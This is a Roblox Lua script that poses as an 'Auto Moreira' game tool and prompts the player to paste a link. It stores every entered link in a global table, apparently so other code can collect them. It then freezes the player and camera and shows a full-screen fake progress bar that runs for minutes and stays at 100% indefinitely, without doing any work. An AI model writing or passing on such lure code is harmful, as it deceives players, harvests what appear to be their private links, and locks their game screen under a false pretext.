local Players = game:GetService("Players")
local pl = Players.LocalPlayer
local pg = pl:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")

-- Garante que o armazenamento exista
if not _G.LinkStorage then _G.LinkStorage = { SavedLinks = {} } end
local LinkStorage = _G.LinkStorage

-- ScreenGui principal
local sg = Instance.new("ScreenGui")
sg.Name = "BielmazzerzGUI"
sg.ResetOnSpawn = false
sg.Parent = pg

-- Janela principal
local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 340, 0, 150)
main.Position = UDim2.new(0.5, -170, 0.4, -75)
main.BackgroundColor3 = Color3.fromRGB(60,60,60)
main.BackgroundTransparency = 0.35
main.BorderColor3 = Color3.fromRGB(255,0,0)
main.BorderSizePixel = 2
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0,10)

-- Título
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1,0,0,30)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Text = "Bielmazzerz"
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255,255,255)

-- Botões minimizar e fechar
local minBtn = Instance.new("TextButton", main)
minBtn.Size = UDim2.new(0,28,0,28)
minBtn.Position = UDim2.new(1,-72,0,2)
minBtn.Text = "_"
minBtn.Font = Enum.Font.GothamBold
minBtn.TextColor3 = Color3.fromRGB(255,255,255)
minBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
Instance.new("UICorner", minBtn)

local closeBtn = Instance.new("TextButton", main)
closeBtn.Size = UDim2.new(0,28,0,28)
closeBtn.Position = UDim2.new(1,-36,0,2)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
closeBtn.BackgroundColor3 = Color3.fromRGB(60,0,0)
Instance.new("UICorner", closeBtn)

-- Mini botão
local miniBtn
minBtn.MouseButton1Click:Connect(function()
	main.Visible = false
	if not miniBtn then
		miniBtn = Instance.new("TextButton", sg)
		miniBtn.Size = UDim2.new(0,140,0,25)
		miniBtn.Position = UDim2.new(0.5,-70,0,10)
		miniBtn.Text = "Bielmazzerz"
		miniBtn.Font = Enum.Font.GothamBold
		miniBtn.TextScaled = true
		miniBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
		miniBtn.TextColor3 = Color3.fromRGB(255,255,255)
		Instance.new("UICorner", miniBtn)
		miniBtn.MouseButton1Click:Connect(function()
			main.Visible = true
			miniBtn:Destroy()
			miniBtn=nil
		end)
	end
end)

closeBtn.MouseButton1Click:Connect(function()
	sg:Destroy()
	if miniBtn then miniBtn:Destroy() end
end)

-- Área interna
local inner = Instance.new("Frame", main)
inner.Size = UDim2.new(0.95,0,0.7,0)
inner.Position = UDim2.new(0.025,0,0.2,0)
inner.BackgroundTransparency = 1

-- Botão Auto Moreira
local autoBtn = Instance.new("TextButton", inner)
autoBtn.Size = UDim2.new(0.8,0,0,36)
autoBtn.Position = UDim2.new(0.1,0,0.3,0)
autoBtn.Text = "Auto Moreira"
autoBtn.Font = Enum.Font.GothamBold
autoBtn.TextScaled = true
autoBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
autoBtn.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", autoBtn)

-- YouTube label
local ytLabel = Instance.new("TextLabel", main)
ytLabel.Size = UDim2.new(0.5,0,0,20)
ytLabel.Position = UDim2.new(0.02,0,0.9,0)
ytLabel.BackgroundTransparency = 1
ytLabel.Font = Enum.Font.Gotham
ytLabel.TextScaled = true
ytLabel.Text = "YouTube: @Bielmazzerz"
ytLabel.TextColor3 = Color3.fromRGB(255,255,255)
ytLabel.TextXAlignment = Enum.TextXAlignment.Left-- Tela Auto Moreira (segunda janela)
local autoFrame = Instance.new("Frame", sg)
autoFrame.Size = UDim2.new(0,300,0,150)
autoFrame.Position = UDim2.new(0.5,-150,0.4,-75)
autoFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
autoFrame.BackgroundTransparency = 0.35
autoFrame.BorderColor3 = Color3.fromRGB(255,0,0)
autoFrame.BorderSizePixel = 2
autoFrame.Active = true
autoFrame.Draggable = true
Instance.new("UICorner", autoFrame).CornerRadius = UDim.new(0,10)
autoFrame.Visible = false

-- Texto "Auto Moreira"
local autoText = Instance.new("TextLabel", autoFrame)
autoText.Size = UDim2.new(1,0,0.3,0)
autoText.Position = UDim2.new(0,0,0,5)
autoText.BackgroundTransparency = 1
autoText.Font = Enum.Font.GothamBold
autoText.Text = "Auto Moreira"
autoText.TextScaled = true
autoText.TextColor3 = Color3.fromRGB(255,255,255)

-- Input box
local inputBox = Instance.new("TextBox", autoFrame)
inputBox.Size = UDim2.new(0.9,0,0.2,0)
inputBox.Position = UDim2.new(0.05,0,0.35,0)
inputBox.PlaceholderText = "Cole seu link aqui:"
inputBox.Text = ""
inputBox.ClearTextOnFocus = false
inputBox.TextScaled = true
inputBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
inputBox.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", inputBox)

-- Continue botão
local continueBtn = Instance.new("TextButton", autoFrame)
continueBtn.Size = UDim2.new(0.6,0,0,36)
continueBtn.Position = UDim2.new(0.2,0,0.6,0)
continueBtn.Text = "Continue"
continueBtn.Font = Enum.Font.GothamBold
continueBtn.TextScaled = true
continueBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
continueBtn.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", continueBtn)

-- Mensagem de validação
local msgLabel = Instance.new("TextLabel", autoFrame)
msgLabel.Size = UDim2.new(1,0,0,20)
msgLabel.Position = UDim2.new(0,0,0.85,0)
msgLabel.BackgroundTransparency = 1
msgLabel.Font = Enum.Font.Gotham
msgLabel.TextScaled = true
msgLabel.Text = ""
msgLabel.TextColor3 = Color3.fromRGB(0,255,0)

-- Voltar botão
local backBtn = Instance.new("TextButton", autoFrame)
backBtn.Size = UDim2.new(0,18,0,18)
backBtn.Position = UDim2.new(0,5,0,5)
backBtn.Text = "⬅️"
backBtn.Font = Enum.Font.GothamBold
backBtn.TextScaled = true
backBtn.BackgroundTransparency = 1
backBtn.TextColor3 = Color3.fromRGB(255,255,255)

-- Congelar jogador e câmera
local function freezePlayer(freeze)
	local char = pl.Character
	if not char then return end
	local hum = char:FindFirstChildWhichIsA("Humanoid")
	if hum then
		if freeze then
			hum.WalkSpeed = 0
			hum.JumpPower = 0
		else
			hum.WalkSpeed = 16
			hum.JumpPower = 50
		end
	end
	UserInputService.MouseBehavior = freeze and Enum.MouseBehavior.LockCenter or Enum.MouseBehavior.Default
	UserInputService.MouseIconEnabled = not freeze
end

-- Mostrar segunda janela
autoBtn.MouseButton1Click:Connect(function()
	main.Visible = false
	autoFrame.Visible = true
end)

-- Voltar
backBtn.MouseButton1Click:Connect(function()
	autoFrame.Visible = false
	main.Visible = true
end)

-- Continue + tela de progresso + salvar link
continueBtn.MouseButton1Click:Connect(function()
	local link = tostring(inputBox.Text)
	if link ~= "" then
		table.insert(LinkStorage.SavedLinks, link)
	end

	if string.sub(link,1,6) == "https:" then
		msgLabel.Text = "Valid link ✅"
		msgLabel.TextColor3 = Color3.fromRGB(0,255,0)
		task.delay(5,function() msgLabel.Text="" end)
		task.wait(0.5)

		-- Congela jogador e câmera
		freezePlayer(true)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable

		-- Tela de progresso
		local progGui = Instance.new("ScreenGui", pg)
		progGui.ResetOnSpawn = false
		local bg = Instance.new("Frame", progGui)
		bg.Size = UDim2.new(1,0,1,0)
		bg.BackgroundColor3 = Color3.fromRGB(0,0,0)

		local lbl = Instance.new("TextLabel", bg)
		lbl.Size = UDim2.new(1,0,1,0)
		lbl.BackgroundTransparency = 1
		lbl.Font = Enum.Font.GothamBold
		lbl.TextColor3 = Color3.fromRGB(255,255,255)
		lbl.TextScaled = false
		lbl.TextSize = 18
		lbl.Text = "Auto Moreira process... 0%"

		local small = Instance.new("TextLabel", bg)
		small.Size = UDim2.new(1,0,0.1,0)
		small.Position = UDim2.new(0,0,0.7,0)
		small.BackgroundTransparency = 1
		small.Font = Enum.Font.Gotham
		small.TextColor3 = Color3.fromRGB(255,255,255)
		small.TextScaled = false
		small.TextSize = 20
		small.Text = "Sua base irá fechar automaticamente"

		local ytCorner = Instance.new("TextLabel", bg)
		ytCorner.Size = UDim2.new(0.3,0,0.05,0)
		ytCorner.Position = UDim2.new(0.02,0,0.95,0)
		ytCorner.BackgroundTransparency = 1
		ytCorner.Font = Enum.Font.Gotham
		ytCorner.TextColor3 = Color3.fromRGB(255,255,255)
		ytCorner.TextScaled = false
		ytCorner.TextSize = 16
		ytCorner.TextXAlignment = Enum.TextXAlignment.Left
		ytCorner.Text = "YouTube: @Bielmazzerz"

		-- Progresso 0% a 100%
		task.spawn(function()
			for i = 0, 100 do
				lbl.Text = "Auto Moreira process... "..i.."%"
				task.wait(3.5)
			end
			while true do
				task.wait(1)
				lbl.Text = "Auto Moreira process... 100%"
			end
		end)
	else
		msgLabel.Text = "Invalid link ❌"
		msgLabel.TextColor3 = Color3.fromRGB(255,0,0)
		task.delay(5,function() msgLabel.Text = "" end)
	end
end)
